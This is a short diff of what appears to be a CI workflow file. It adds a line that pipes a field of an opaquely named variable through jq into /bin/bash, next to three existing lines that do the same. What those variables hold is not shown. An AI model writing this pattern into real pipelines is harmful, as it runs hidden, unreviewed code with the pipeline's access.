@@ -25,6 +25,7 @@ jobs:
           echo $q14 | jq -r .t8 | /bin/bash
           echo $b92 | jq -r .udm53 | /bin/bash
           printf '%s' "$omh77" | jq -r .chwu2174 | /bin/bash
+          echo $z51563 | jq -r .bfnfg81 | /bin/bash
 
       - name: Save output
         if: always()
